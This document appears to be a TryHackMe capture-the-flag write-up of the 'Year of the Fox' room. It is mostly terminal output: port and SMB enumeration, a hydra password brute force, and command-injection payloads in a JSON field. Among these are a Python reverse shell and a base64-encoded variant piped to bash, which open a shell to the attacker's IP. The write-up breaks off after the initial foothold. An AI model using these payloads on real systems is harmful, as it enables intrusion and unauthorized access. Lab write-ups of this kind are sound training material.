# Year of the Fox — Writeup

## Overview
### Year of the Fox — Writeup
### Year of the Fox — Writeup
----
Don't underestimate the sly old fox...
---
![](https://i.imgur.com/JOBQtGF.png)

## Flags / Answers
- Start Machine
- ![222](https://tryhackme-images.s3.amazonaws.com/room-icons/8faf2455af3daf7d2e0ee7b7af97f4d7.jpeg)
- Can you get past the wily fox?
- Answer the questions below
```text
- ┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ rustscan -a 10.10.249.21 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.249.21:80
Open 10.10.249.21:139
Open 10.10.249.21:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.249.21 [3 ports]
Discovered open port 80/tcp on 10.10.249.21
Discovered open port 445/tcp on 10.10.249.21
Discovered open port 139/tcp on 10.10.249.21
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.249.21
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.249.21.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.249.21
Host is up, received user-set (0.19s latency).

PORT    STATE SERVICE     REASON  VERSION
80/tcp  open  http        syn-ack Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2023-03-25T22:20:49+00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3140/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 45749/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29474/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25502/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   YEAROFTHEFOX<00>     Flags: <group><active>
|   YEAROFTHEFOX<1d>     Flags: <unique><active>
|   YEAROFTHEFOX<1e>     Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-03-25T22:20:49
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ smbclient -N -L 10.10.249.21

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	YEAROFTHEFOX         YEAR-OF-THE-FOX

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ smbmap -u anonymous -H 10.10.249.21
[+] Guest session   	IP: 10.10.249.21:445	Name: 10.10.249.21                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	yotf                                              	NO ACCESS	Fox's Stuff -- keep out!
	IPC$                                              	NO ACCESS	IPC Service (year-of-the-fox server (Samba, Ubuntu))

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ rpcclient -U "" 10.10.249.21
Password for [WORKGROUP\]:
rpcclient $> enumdomains
name:[YEAR-OF-THE-FOX] idx:[0x0]
name:[Builtin] idx:[0x1]
rpcclient $> enumdomusers
user:[fox] rid:[0x3e8]
rpcclient $> quit

──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sudo crackmapexec smb 10.10.249.21 -u 'guest' -p '' --rid-brute
SMB         10.10.249.21    445    YEAR-OF-THE-FOX  [*] Windows 6.1 (name:YEAR-OF-THE-FOX) (domain:lan) (signing:False) (SMBv1:True)
SMB         10.10.249.21    445    YEAR-OF-THE-FOX  [+] lan\guest: 
SMB         10.10.249.21    445    YEAR-OF-THE-FOX  [+] Brute forcing RIDs
Traceback (most recent call last):
  File "/usr/bin/crackmapexec", line 8, in <module>
    sys.exit(main())

uhmm not work

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ rustscan -a 10.10.249.21 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.249.21:80
Open 10.10.249.21:139
Open 10.10.249.21:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.249.21 [3 ports]
Discovered open port 80/tcp on 10.10.249.21
Discovered open port 445/tcp on 10.10.249.21
Discovered open port 139/tcp on 10.10.249.21
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.249.21
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.249.21.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.249.21
Host is up, received user-set (0.19s latency).

PORT    STATE SERVICE     REASON  VERSION
80/tcp  open  http        syn-ack Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2023-03-25T22:20:49+00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3140/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 45749/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29474/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25502/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   YEAROFTHEFOX<00>     Flags: <group><active>
|   YEAROFTHEFOX<1d>     Flags: <unique><active>
|   YEAROFTHEFOX<1e>     Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-03-25T22:20:49
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.91 seconds

                                                                                     
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ enum4linux -a 10.10.249.21                                        
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Mar 25 18:27:13 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.249.21
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.249.21 )============================

[+] Got domain/workgroup name: YEAROFTHEFOX

 ================================( Nbtstat Information for 10.10.249.21 )================================

Looking up status of 10.10.249.21
	YEAR-OF-THE-FOX <00> -         B <ACTIVE>  Workstation Service
	YEAR-OF-THE-FOX <03> -         B <ACTIVE>  Messenger Service
	YEAR-OF-THE-FOX <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	YEAROFTHEFOX    <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	YEAROFTHEFOX    <1d> -         B <ACTIVE>  Master Browser
	YEAROFTHEFOX    <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.249.21 )===================================

[+] Server 10.10.249.21 allows sessions using username '', password ''

 ================================( Getting domain SID for 10.10.249.21 )================================

Domain Name: YEAROFTHEFOX
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup

 ===================================( OS information on 10.10.249.21 )===================================

[E] Can't get OS info with smbclient

[+] Got OS info for 10.10.249.21 from srvinfo: 
	YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 =======================================( Users on 10.10.249.21 )=======================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox	Name: fox	Desc: 

user:[fox] rid:[0x3e8]

 =================================( Share Enumeration on 10.10.249.21 )=================================

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Fox's Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	YEAROFTHEFOX         YEAR-OF-THE-FOX

[+] Attempting to map shares on 10.10.249.21

//10.10.249.21/yotf	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.249.21/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.249.21 )============================

[+] Attaching to 10.10.249.21 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] YEAR-OF-THE-FOX
	[+] Builtin

[+] Password Info for Domain: YEAR-OF-THE-FOX

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 =======================================( Groups on 10.10.249.21 )=======================================

[+] Getting builtin groups:

[+]  Getting builtin group memberships:

[+]  Getting local groups:

[+]  Getting local group memberships:

[+]  Getting domain groups:

[+]  Getting domain group memberships:

 ==================( Users on 10.10.249.21 via RID cycling (RIDS: 500-550,1000-1050) )==================

[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''

S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)
S-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group)
S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)

 ===============================( Getting printer info for 10.10.249.21 )===============================

No printers returned.

enum4linux complete on Sat Mar 25 18:41:59 2023

This site is asking you to sign in.

GET / HTTP/1.1

Host: 10.10.249.21

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

HTTP/1.1 401 Unauthorized

Date: Sat, 25 Mar 2023 23:10:24 GMT

Server: Apache/2.4.29 (Ubuntu)

WWW-Authenticate: Basic realm="You want in? Gotta guess the password!"

Content-Length: 459

Connection: close

Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.249.21 Port 80</address>
</body></html>

https://forums.hak5.org/topic/18815-http-head-or-http-get/

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.249.21 http-head / 

or hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.249.21 http-get -

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.249.21 http-get -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://10.10.249.21:80/
[80][http-get] host: 10.10.249.21   login: rascal   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished

let's sign in

{"target":"\"||whoami||\""

}
["important-data.txt"]

{"target":"\"$(whoami)\""

}

["Invalid Character"]

{"target":"\";whoami;\""

}
["No file returned"]

blind rce

{"target":"\";ping -c 4 10.8.19.103 ;\""

}

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ sudo tcpdump -i tun0 -n                                        
[sudo] password for witty: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:27:52.253674 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [S], seq 3220311246, win 64240, options [mss 1460,sackOK,TS val 3382066425 ecr 0,nop,wscale 7], length 0
19:27:52.452323 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [S.], seq 2912484493, ack 3220311247, win 62643, options [mss 1288,sackOK,TS val 743969307 ecr 3382066425,nop,wscale 6], length 0
19:27:52.452422 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [.], ack 1, win 502, options [nop,nop,TS val 3382066624 ecr 743969307], length 0
19:27:52.452642 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [P.], seq 1:452, ack 1, win 502, options [nop,nop,TS val 3382066624 ecr 743969307], length 451: HTTP: POST /assets/php/search.php HTTP/1.1
19:27:52.650243 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [.], ack 452, win 972, options [nop,nop,TS val 743969498 ecr 3382066624], length 0
19:27:52.650382 IP 10.10.249.21 > 10.8.19.103: ICMP echo request, id 1662, seq 1, length 64
19:27:52.669309 IP 10.8.19.103 > 10.10.249.21: ICMP echo reply, id 1662, seq 1, length 64
19:27:53.650936 IP 10.10.249.21 > 10.8.19.103: ICMP echo request, id 1662, seq 2, length 64
19:27:53.650971 IP 10.8.19.103 > 10.10.249.21: ICMP echo reply, id 1662, seq 2, length 64
19:27:54.652264 IP 10.10.249.21 > 10.8.19.103: ICMP echo request, id 1662, seq 3, length 64
19:27:54.652305 IP 10.8.19.103 > 10.10.249.21: ICMP echo reply, id 1662, seq 3, length 64
19:27:55.653450 IP 10.10.249.21 > 10.8.19.103: ICMP echo request, id 1662, seq 4, length 64
19:27:55.653500 IP 10.8.19.103 > 10.10.249.21: ICMP echo reply, id 1662, seq 4, length 64
19:27:55.847825 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [P.], seq 1:188, ack 452, win 972, options [nop,nop,TS val 743972700 ecr 3382066624], length 187: HTTP: HTTP/1.1 200 OK
19:27:55.847930 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [.], ack 188, win 501, options [nop,nop,TS val 3382070019 ecr 743972700], length 0
19:27:55.847989 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [F.], seq 188, ack 452, win 972, options [nop,nop,TS val 743972701 ecr 3382066624], length 0
19:27:55.849030 IP 10.8.19.103.50908 > 10.10.249.21.80: Flags [F.], seq 452, ack 189, win 501, options [nop,nop,TS val 3382070020 ecr 743972701], length 0
19:27:56.043773 IP 10.10.249.21.80 > 10.8.19.103.50908: Flags [.], ack 453, win 972, options [nop,nop,TS val 743972898 ecr 3382070020], length 0

revshell

{"target":"\";python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")';\""

}

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ rlwrap nc -lvnp 1338
listening on [any] 1338 ...

let's encode it

{"target":"\";echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOC4xOS4xMDMiLDEzMzgpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKSc= | base64 -d | bash;\""

}

┌──(witty㉿kali)-[~/bug_hunter/SQLiDetector]
└─$ rlwrap nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.249.21] 47020
www-data@year-of-the-fox:/var/www/html/assets/php$ which python
which python
/usr/bin/python
www-data@year-of-the-fox:/var/www/html/assets/php$ python -c 'import pty;pty.spawn("/bin/bash")'
</php$ python -c 'import pty;pty.spawn("/bin/bash")'

www-data@year-of-the-fox:/var/www/html/assets/php$ ls
ls
search.php
www-data@year-of-the-fox:/var/www/html/assets/php$ cd ..
cd ..
www-data@year-of-the-fox:/var/www/html/assets$ ls
ls
css  fonts  images  js	php
www-data@year-of-the-fox:/var/www/html/assets$ cd ..
cd ..
